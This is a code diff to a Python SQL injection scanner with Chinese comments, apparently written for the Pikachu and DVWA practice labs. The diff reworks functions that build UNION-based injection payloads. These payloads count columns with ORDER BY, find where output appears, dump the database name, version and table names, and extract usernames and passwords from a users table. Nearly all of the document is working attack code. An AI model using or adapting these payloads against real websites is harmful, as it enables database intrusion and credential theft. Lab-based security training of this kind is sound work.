@@ -439,7 +439,7 @@ class SQLInjectionScanner:
                 return True
         return False
 
-    def detect_column_count(self, url, method, param, data_template, closing_pattern):
+    def detect_column_count(self, url, method, param, data_template, payload):
         """通过ORDER BY判断字段数"""
         self.print(f"[*] 正在判断字段数...")
         
@@ -449,14 +449,7 @@ class SQLInjectionScanner:
         
         # 首先尝试使用ORDER BY 来快速确定字段数
         for i in range(1, 11):  # 测试到10个字段
-            if closing_pattern == "string":
-                test_payload = f"vince' ORDER BY {i} # "
-            elif closing_pattern == "search":
-                test_payload = f"a' ORDER BY {i} # "
-            elif closing_pattern == "xx":
-                test_payload = f"1') ORDER BY {i} # "
-            else:  # numeric
-                test_payload = f"1 ORDER BY {i}"
+            test_payload = f"{payload} ORDER BY {i} # "
             
             if method == 'GET':
                 # 根据靶场类型决定submit参数名和值
@@ -465,9 +458,6 @@ class SQLInjectionScanner:
                     submit_value = '查询'
                 elif 'dvwa' in self.base_url:
                     submit_param = 'Submit'
-                    submit_value = 'submit'
-                else:
-                    submit_param = 'submit'
                     submit_value = 'Submit'
                 response = self.send_request(url, params={param: test_payload, submit_param: submit_value})
             else:
@@ -499,7 +489,7 @@ class SQLInjectionScanner:
         self.print("[-] 无法准确判断字段数，尝试使用默认值2")
         return 2  # Pikachu大多数情况是2个字段
 
-    def detect_output_positions(self, url, method, param, data_template, closing_pattern, column_count):
+    def detect_output_positions(self, url, method, param, data_template, payload, column_count):
         """
         通过比较union select 1,1和union select 2,2的输出来确定网页信息的输出位置
         
@@ -519,19 +509,22 @@ class SQLInjectionScanner:
         # 构造union select 1,1和union select 2,2的payload
         select_ones = ",".join(["1"] * column_count)
         select_twos = ",".join(["2"] * column_count)
+
+        payload_ones = f"{payload} union select {select_ones} # "
+        payload_twos = f"{payload} union select {select_twos} # "
         
-        if closing_pattern == "string":
-            payload_ones = f"vince' union select {select_ones} # "
-            payload_twos = f"vince' union select {select_twos} # "
-        elif closing_pattern == "search":
-            payload_ones = f"vince' union select {select_ones} # "
-            payload_twos = f"vince' union select {select_twos} # "
-        elif closing_pattern == "xx":
-            payload_ones = f"1') union select {select_ones} # "
-            payload_twos = f"1') union select {select_twos} # "
-        else:  # numeric
-            payload_ones = f"1 union select {select_ones}"
-            payload_twos = f"1 union select {select_twos}"
+        # if closing_pattern == "string":
+        #     payload_ones = f"vince' union select {select_ones} # "
+        #     payload_twos = f"vince' union select {select_twos} # "
+        # elif closing_pattern == "search":
+        #     payload_ones = f"vince' union select {select_ones} # "
+        #     payload_twos = f"vince' union select {select_twos} # "
+        # elif closing_pattern == "xx":
+        #     payload_ones = f"1') union select {select_ones} # "
+        #     payload_twos = f"1') union select {select_twos} # "
+        # else:  # numeric
+        #     payload_ones = f"1 union select {select_ones}"
+        #     payload_twos = f"1 union select {select_twos}"
         
         # 发送两个请求
         if method == 'GET':
@@ -541,9 +534,6 @@ class SQLInjectionScanner:
                 submit_value = '查询'
             elif 'dvwa' in self.base_url:
                 submit_param = 'Submit'
-                submit_value = 'submit'
-            else:
-                submit_param = 'submit'
                 submit_value = 'Submit'
             response_ones = self.send_request(url, params={param: payload_ones, submit_param: submit_value})
             response_twos = self.send_request(url, params={param: payload_twos, submit_param: submit_value})
@@ -567,18 +557,18 @@ class SQLInjectionScanner:
             # 分析差异，找出包含"1"和"2"的位置
             output_positions = []
             for change in changes['added']:
-                if "2" in change:
-                    # 替换"2"为捕获组，创建正则表达式模式
-                    # 这里简单处理，实际可能需要更复杂的逻辑
-                    pattern = re.escape(change).replace("\\2", "(.*?)")
-                    output_positions.append(pattern)
+                change = change.replace(payload_twos, "")
+                change = change.replace("用户名中含有的结果如下：", "") # 土法
+                for i in range(1, column_count + 1):
+                    if "2" in change:
+                        # 替换"2"为捕获组，创建正则表达式模式
+                        # 这里简单处理，实际可能需要更复杂的逻辑
+                        pattern = re.escape(change.strip()).replace("2", "(.*?)", i).replace("2",".*?").__add__(f"(?={change[:4]}|\Z)")
+                        output_positions.append(pattern)
             
             if output_positions:
                 self.print(f"[+] 成功检测到输出位置，找到 {len(output_positions)} 个可能的数据输出点")
-                return {
-                    'output_positions': output_positions,
-                    'custom_pattern': ".*?".join(output_positions) if len(output_positions) > 1 else output_positions[0]
-                }
+                return output_positions
             else:
                 # 如果无法自动检测，尝试使用传统方法
                 self.print("[-] 无法自动检测输出位置，使用默认模式")
@@ -588,12 +578,12 @@ class SQLInjectionScanner:
         self.print("[-] 检测输出位置失败")
         return None
     
-    def extract_with_union(self, url, method, param, data_template, closing_pattern, column_count):
+    def extract_with_union(self, url, method, param, data_template, payload, column_count):
         """使用UNION查询提取数据"""
         self.print(f"[*] 尝试使用UNION查询提取数据...")
         
         # 检测数据输出位置，动态生成正则表达式
-        output_info = self.detect_output_positions(url, method, param, data_template, closing_pattern, column_count)
+        output_info = self.detect_output_positions(url, method, param, data_template, payload, column_count)
         
         # 构造union select payload
         select_parts = []
@@ -603,17 +593,18 @@ class SQLInjectionScanner:
         union_select = ",".join(select_parts)
         
         # 根据不同的闭合模式构造payload
-        if closing_pattern == "string":
-            union_payload = f"vince' union select {union_select} # "
-        elif closing_pattern == "search":
-            union_payload = f"vince' union select {union_select} # "
-        elif closing_pattern == "xx":
-            union_payload = f"1') union select {union_select} # "
-        else:  # numeric
-            union_payload = f"1 union select {union_select}"
+        union_payload = f"{payload} union select {union_select} # "
+        # if closing_pattern == "string":
+        #     union_payload = f"vince' union select {union_select} # "
+        # elif closing_pattern == "search":
+        #     union_payload = f"vince' union select {union_select} # "
+        # elif closing_pattern == "xx":
+        #     union_payload = f"1') union select {union_select} # "
+        # else:  # numeric
+        #     union_payload = f"1 union select {union_select}"
         
         # 发送请求并与标准请求比较变化
-        standard_input = {"string": "vince", "search": "vince", "xx": "1", "numeric": "1"}
+        # standard_input = {"string": "vince", "search": "vince", "xx": "1", "numeric": "1"}
         
         if method == 'GET':
             # 根据靶场类型决定submit参数名和值
@@ -622,20 +613,17 @@ class SQLInjectionScanner:
                 submit_value = '查询'
             elif 'dvwa' in self.base_url:
                 submit_param = 'Submit'
-                submit_value = 'submit'
-            else:
-                submit_param = 'submit'
                 submit_value = 'Submit'
             response = self.send_request(url, params={param: union_payload, submit_param: submit_value})
             # 获取标准响应用于比较
-            standard_response = self.send_request(url, params={param: standard_input[closing_pattern], submit_param: submit_value})
+            standard_response = self.send_request(url, params={param: "test", submit_param: submit_value})
         else:
             data = data_template.copy() if data_template else {}
             data[param] = union_payload
             response = self.send_request(url, method='POST', data=data)
             # 获取标准响应用于比较
             standard_data = data_template.copy() if data_template else {}
-            standard_data[param] = standard_input[closing_pattern]
+            standard_data[param] = "test"
             standard_response = self.send_request(url, method='POST', data=standard_data)
         
         # 比较响应差异，确保所有注入类型都能捕获页面变化
@@ -652,19 +640,19 @@ class SQLInjectionScanner:
             self.print("[+] UNION查询成功，开始提取数据...")
             
             # 提取数据库信息
-            self.extract_database_info(url, method, param, data_template, closing_pattern, column_count, output_info)
+            self.extract_database_info(url, method, param, data_template, payload, column_count, output_info)
             
             # 提取表信息
-            tables = self.extract_tables(url, method, param, data_template, closing_pattern, column_count, output_info)
+            tables = self.extract_tables(url, method, param, data_template, payload, column_count, output_info)
             
             # 提取用户数据 - 即使没有检测到tables或users表，也尝试提取
             # 这样可以确保在所有注入类型中都能捕获页面变化
-            self.extract_user_data(url, method, param, data_template, closing_pattern, column_count, output_info)
+            self.extract_user_data(url, method, param, data_template, payload, column_count, output_info)
             
             return True
         return False
 
-    def extract_database_info(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
+    def extract_database_info(self, url, method, param, data_template, payload, column_count, output_info=None):
         """提取数据库信息，支持动态适配不同网站的输出格式"""
         self.print("[*] 提取数据库信息...")
         select_parts = []
@@ -675,14 +663,15 @@ class SQLInjectionScanner:
         
         if column_count >= 2:
             # 动态构造payload
-            if closing_pattern == "string":
-                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
-            elif closing_pattern == "search":
-                payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
-            elif closing_pattern == "xx":
-                payload = f"1') union select {union_select},concat(database(),'|',version()) # "
-            else:
-                payload = f"1 union select {union_select},concat(database(),'|',version())"
+            test_payload = f"{payload} union select concat(database(),'|',version()),{union_select} # "
+            # if closing_pattern == "string":
+            #     payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
+            # elif closing_pattern == "search":
+            #     payload = f"vince' union select {union_select},concat(database(),'|',version()) # "
+            # elif closing_pattern == "xx":
+            #     payload = f"1') union select {union_select},concat(database(),'|',version()) # "
+            # else:
+            #     payload = f"1 union select {union_select},concat(database(),'|',version())"
             
             # 发送请求和标准请求进行比较
             if method == 'GET':
@@ -691,15 +680,12 @@ class SQLInjectionScanner:
                     submit_value = '查询'
                 elif 'dvwa' in self.base_url:
                     submit_param = 'Submit'
-                    submit_value = 'submit'
-                else:
-                    submit_param = 'submit'
                     submit_value = 'Submit'
-                response = self.send_request(url, params={param: payload, submit_param: submit_value})    
+                response = self.send_request(url, params={param: test_payload, submit_param: submit_value})    
                 standard_response = self.send_request(url, params={param: "test", 'submit': submit_value})
             else:
                 data = data_template.copy() if data_template else {}
-                data[param] = payload
+                data[param] = test_payload
                 response = self.send_request(url, method='POST', data=data)
                 # 获取标准响应用于比较
                 standard_data = data_template.copy() if data_template else {}
@@ -714,9 +700,9 @@ class SQLInjectionScanner:
                 
                 # 优先使用动态生成的正则表达式
                 database_info_found = False
-                if output_info and 'output_positions' in output_info:
+                if output_info:
                     self.print("[*] 使用动态生成的正则表达式提取数据库信息...")
-                    for pattern in output_info['output_positions']:
+                    for pattern in output_info[:1]:
                         # 查找所有新增内容中的匹配
                         for added_content in res['added']:
                             matches = re.findall(pattern, added_content)
@@ -835,7 +821,7 @@ class SQLInjectionScanner:
                 if not database_info_found:
                     self.print("[-] 无法提取数据库信息")
 
-    def extract_tables(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
+    def extract_tables(self, url, method, param, data_template, payload, column_count, output_info=None):
         """提取数据库表信息，支持动态适配不同网站的输出格式"""
         self.print("[*] 提取数据库表信息...")
         select_parts = []
@@ -857,14 +843,15 @@ class SQLInjectionScanner:
         }
         
         # 构造查询payload
-        if closing_pattern == "string":
-            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        elif closing_pattern == "search":
-            payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        elif closing_pattern == "xx":
-            payload = f"1') union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
-        else:
-            payload = f"1 union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database()"
+        test_payload = f"{payload} union select group_concat(table_name),{union_select} from information_schema.tables WHERE table_schema=database() # "
+        # if closing_pattern == "string":
+        #     payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
+        # elif closing_pattern == "search":
+        #     payload = f"vince' union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
+        # elif closing_pattern == "xx":
+        #     payload = f"1') union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database() # "
+        # else:
+        #     payload = f"1 union select {union_select},group_concat(table_name) from information_schema.tables WHERE table_schema=database()"
         
         # 发送请求
         if method == 'GET':
@@ -874,28 +861,25 @@ class SQLInjectionScanner:
                 submit_value = '查询'
             elif 'dvwa' in self.base_url:
                 submit_param = 'Submit'
-                submit_value = 'submit'
-            else:
-                submit_param = 'submit'
                 submit_value = 'Submit'
-            response = self.send_request(url, params={param: payload, submit_param: submit_value})
-            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], submit_param: submit_value})
+            response = self.send_request(url, params={param: test_payload, submit_param: submit_value})
+            standard_response = self.send_request(url, params={param: "vince", submit_param: submit_value})
         else:
             data = data_template.copy() if data_template else {}
-            data[param] = payload
+            data[param] = test_payload
             # 根据靶场类型在POST数据中添加submit参数
             if 'pikachu' in self.base_url:
                 data['submit'] = '查询'
             elif 'dvwa' in self.base_url:
-                data['Submit'] = 'submit'
+                data['Submit'] = 'Submit'
             response = self.send_request(url, method='POST', data=data)
             standard_data = data_template.copy() if data_template else {}
-            standard_data[param] = standard_input[f'{closing_pattern}']
+            standard_data[param] = "test"
             # 同样为标准请求添加submit参数
             if 'pikachu' in self.base_url:
                 standard_data['submit'] = '查询'
             elif 'dvwa' in self.base_url:
-                standard_data['Submit'] = 'submit'
+                standard_data['Submit'] = 'Submit'
             standard_response = self.send_request(url, method='POST', data=standard_data)
         
         if response and standard_response:
@@ -910,9 +894,10 @@ class SQLInjectionScanner:
             tables = []
             
             # 1. 使用动态生成的正则表达式提取
-            if output_info and 'output_positions' in output_info:
+            if output_info:
                 self.print("[*] 使用动态生成的正则表达式提取表信息...")
-                for pattern in output_info['output_positions']:
+                for pattern in output_info[:1]:
+                    print(f"[*] 使用的正则表达式：{pattern}")
                     # 查找所有新增内容中的匹配
                     for added_content in res['added']:
                         matches = re.findall(pattern, added_content)
@@ -1077,7 +1062,7 @@ class SQLInjectionScanner:
                         final_tables.append(table)
                 
                 if final_tables:
-                    self.print(f"所有数据库表名：")
+                    self.print(f"[*] 所有数据库表名：")
                     for table in final_tables:
                         self.print(table)
                     return final_tables
@@ -1093,7 +1078,7 @@ class SQLInjectionScanner:
             self.print("未找到匹配的表名。")
         return None
 
-    def extract_user_data(self, url, method, param, data_template, closing_pattern, column_count, output_info=None):
+    def extract_user_data(self, url, method, param, data_template, payload, column_count, output_info=None):
         """提取用户数据，支持动态适配不同网站的输出格式"""
         self.print("[*] 提取用户数据...")
         standard_input = {
@@ -1110,28 +1095,34 @@ class SQLInjectionScanner:
         }
         
         # 动态构造payload，考虑不同的列数
-        if closing_pattern == "string":
-            if column_count >= 2:
-                payload = f"vince' union select username,password from users # "
-            else:
-                payload = f"vince' union select username from users # "
-        elif closing_pattern == "search":
-            if column_count >= 3:
-                payload = f"vince' union select 1,username,password from users # "
-            elif column_count >= 2:
-                payload = f"vince' union select username,password from users # "
-            else:
-                payload = f"vince' union select username from users # "
-        elif closing_pattern == "xx":
-            if column_count >= 2:
-                payload = f"1') union select username,password from users # "
-            else:
-                payload = f"1') union select username from users # "
-        else:
-            if column_count >= 2:
-                payload = f"1 union select username,password from users"
-            else:
-                payload = f"1 union select username from users"
+        dict = {
+            1:"username",
+            2:"username,password",
+            3:"1,username,password",
+        }
+        test_payload = f"{payload} union select {dict[column_count]} from users # "
+        # if closing_pattern == "string":
+        #     if column_count >= 2:
+        #         payload = f"vince' union select username,password from users # "
+        #     else:
+        #         payload = f"vince' union select username from users # "
+        # elif closing_pattern == "search":
+        #     if column_count >= 3:
+        #         payload = f"vince' union select 1,username,password from users # "
+        #     elif column_count >= 2:
+        #         payload = f"vince' union select username,password from users # "
+        #     else:
+        #         payload = f"vince' union select username from users # "
+        # elif closing_pattern == "xx":
+        #     if column_count >= 2:
+        #         payload = f"1') union select username,password from users # "
+        #     else:
+        #         payload = f"1') union select username from users # "
+        # else:
+        #     if column_count >= 2:
+        #         payload = f"1 union select username,password from users"
+        #     else:
+        #         payload = f"1 union select username from users"
         
         # 发送请求
         if method == 'GET':
@@ -1141,18 +1132,15 @@ class SQLInjectionScanner:
                 submit_value = '查询'
             elif 'dvwa' in self.base_url:
                 submit_param = 'Submit'
-                submit_value = 'submit'
-            else:
-                submit_param = 'submit'
                 submit_value = 'Submit'
-            response = self.send_request(url, params={param: payload, submit_param: submit_value})
-            standard_response = self.send_request(url, params={param: standard_input[f'{closing_pattern}'], submit_param: submit_value})
+            response = self.send_request(url, params={param: test_payload, submit_param: submit_value})
+            standard_response = self.send_request(url, params={param: "test", submit_param: submit_value})
         else:
             data = data_template.copy() if data_template else {}
-            data[param] = payload
+            data[param] = test_payload
             response = self.send_request(url, method='POST', data=data)
             standard_data = data_template.copy() if data_template else {}
-            standard_data[param] = standard_input[f'{closing_pattern}']
+            standard_data[param] = "test"
             standard_response = self.send_request(url, method='POST', data=standard_data)
         
         if response and standard_response:
@@ -1167,20 +1155,23 @@ class SQLInjectionScanner:
             user_records = []
             
             # 1. 使用动态生成的正则表达式提取
-            if output_info and 'output_positions' in output_info:
+            if output_info:
                 self.print("[*] 使用动态生成的正则表达式提取用户数据...")
                 # 查找所有可能包含用户数据的匹配
                 all_matches = []
                 
-                for pattern in output_info['output_positions']:
+                for pattern in output_info[column_count - 1:]:
+                    print(f"[*] 使用的正则表达式：{pattern}")
                     # 查找新增内容中的匹配
                     for added_content in res['added']:
+                        # print(f"新增内容：{added_content}")
                         matches = re.findall(pattern, added_content)
+                        # print(f"匹配结果：{matches}")
                         all_matches.extend(matches)
                 
                 # 分析匹配结果，尝试识别用户名和密码
                 if all_matches:
-                    self.print("\n找到的用户数据 (动态匹配):")
+                    self.print("[*] 找到的用户数据 (动态匹配):")
                     for i, match in enumerate(all_matches, 1):
                         record = {}
                         if isinstance(match, tuple):
@@ -1200,12 +1191,12 @@ class SQLInjectionScanner:
                                     elif self._is_potential_uid(field_str):
                                         record['uid'] = field_str
                                 
-                                self.print(f"记录 {i}, 字段 {j}: {field_str}")
+                                self.print(f"{i}.{j}: {field_str}")
                         else:
                             field_str = match.strip()
                             if field_str:
                                 record['data'] = field_str
-                                self.print(f"记录 {i}: {field_str}")
+                                self.print(f"记录{i}: {field_str}")
                         
                         if record:
                             user_records.append(record)
@@ -1270,18 +1261,18 @@ class SQLInjectionScanner:
                                         # 尝试根据位置和内容识别字段类型
                                         if j == 0 and self._is_potential_username(field_str):
                                             record['username'] = field_str
-                                            self.print(f"记录 {i}, 用户名: {field_str}")
+                                            self.print(f"记录{i}, 用户名: {field_str}")
                                         elif j == 1 and self._is_potential_password(field_str):
                                             record['password'] = field_str
-                                            self.print(f"记录 {i}, 密码: {field_str}")
+                                            self.print(f"记录{i}, 密码: {field_str}")
                                         elif self._is_potential_email(field_str):
                                             record['email'] = field_str
-                                            self.print(f"记录 {i}, 邮箱: {field_str}")
+                                            self.print(f"记录{i}, 邮箱: {field_str}")
                                         elif self._is_potential_uid(field_str):
                                             record['uid'] = field_str
-                                            self.print(f"记录 {i}, ID: {field_str}")
+                                            self.print(f"记录{i}, ID: {field_str}")
                                         else:
-                                            self.print(f"记录 {i}, 字段 {j}: {field_str}")
+                                            self.print(f"记录{i}, 字段 {j}: {field_str}")
                                         record[f'field_{j}'] = field_str
                             
                             if record:
